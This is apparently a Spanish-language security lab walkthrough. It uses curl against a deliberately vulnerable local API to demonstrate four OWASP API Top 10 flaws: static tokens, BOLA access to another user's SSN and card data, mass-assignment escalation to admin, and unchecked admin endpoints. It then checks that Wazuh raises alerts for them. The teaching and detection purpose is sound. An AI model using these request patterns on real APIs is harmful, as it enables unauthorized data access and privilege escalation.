# Escenario: Seguridad de APIs — OWASP API Top 10

**Duracion estimada:** 45 minutos
**Servicios necesarios:** API Vulnerable (:8025), Wazuh (:5601)
**Lo que aprenderas:** Las 4 vulnerabilidades mas comunes de APIs REST y como se detectan.

---

## Objetivo

Explotar 4 vulnerabilidades en la API del lab y ver en tiempo real como Wazuh las clasifica.

La API esta en http://localhost:8025. Usa `curl` para todos los ejercicios.

---

## Paso 1 — Verificar que la API esta activa

```bash
curl http://localhost:8025/api/health
```

Respuesta esperada:

```json
{"service": "opsn-api", "status": "ok"}
```

---

## Paso 2 — API2: Broken Authentication

Obtener un token de alice:

```bash
curl -s -X POST http://localhost:8025/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice123"}'
```

Respuesta:

```json
{
  "note": "Este token nunca expira -- API2:2023 Broken Authentication",
  "token": "token_alice"
}
```

**Vulnerabilidad:** Los tokens son estaticos, predecibles y nunca expiran.

---

## Paso 3 — API1: BOLA (Broken Object Level Authorization)

Con el token de alice, accede al perfil de bob (user_id=2):

```bash
curl -s http://localhost:8025/api/users/2/profile \
  -H "Authorization: Bearer token_alice"
```

Obtienes el perfil completo de bob, incluyendo credit_card, ssn y salary.

**Vulnerabilidad:** El servidor no verifica que el token de alice solo puede acceder al user_id=1.

---

## Paso 4 — API3: Mass Assignment

Escala los privilegios de alice a admin:

```bash
curl -s -X PUT http://localhost:8025/api/users/1/profile \
  -H "Authorization: Bearer token_alice" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin","salary":999999}'
```

El servidor aplica los cambios sin filtrar ningún campo.

**Vulnerabilidad:** El endpoint PUT aplica todos los campos del JSON sin una lista blanca.

---

## Paso 5 — API5: Broken Function Level Authorization

Con token de alice (user), accede al endpoint de administracion:

```bash
curl -s http://localhost:8025/api/admin/users \
  -H "Authorization: Bearer token_alice"
```

Obtienes la lista completa de todos los usuarios.

**Vulnerabilidad:** El endpoint existe y responde sin verificar el rol del token.

---

## Paso 6 — Ver las alertas en Wazuh

Abre https://localhost:5601 y busca:

```
group: openseclab_api
```

Deberas ver reglas 100061 (BOLA), 100063 (Mass Assignment) y 100064 (Broken Function Auth).

---

## Para reflexionar

- Como deberia implementarse la verificacion de autorizacion a nivel de objeto?
- Que lista blanca deberia existir para el endpoint PUT /profile?
- Que diferencia hay entre autenticacion (saber quien eres) y autorizacion (saber que puedes hacer)?
